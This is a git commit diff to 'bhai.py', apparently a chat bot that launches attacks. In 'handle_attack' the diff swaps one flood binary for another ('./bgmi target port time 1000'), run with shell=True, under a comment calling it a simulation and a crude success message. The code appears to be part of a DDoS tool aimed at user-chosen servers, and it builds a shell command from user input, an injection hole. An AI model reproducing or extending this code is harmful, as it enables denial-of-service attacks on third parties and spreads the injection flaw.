82c28796e6789a90ab1fec9999fd50a839dfdb8e
sklfjlskaf <sdafjksfdakldsfdsfdkfljsdklfjd@gmail.com>
2025-02-13 21:41:50 -0800

    Update bhai.py

--- bhai.py
+++ bhai.py
@@ -300,7 +300,7 @@ def handle_attack(message):
                     start_attack_reply(message, target, port, time)
 
                     # Simulate attack process
-                    full_command = f"./paradox {target} {port} {time}"
+                    full_command = f"./bgmi {target} {port} {time} 1000"
                     subprocess.run(full_command, shell=True)
 
                     response = "Chudai completed successfully."
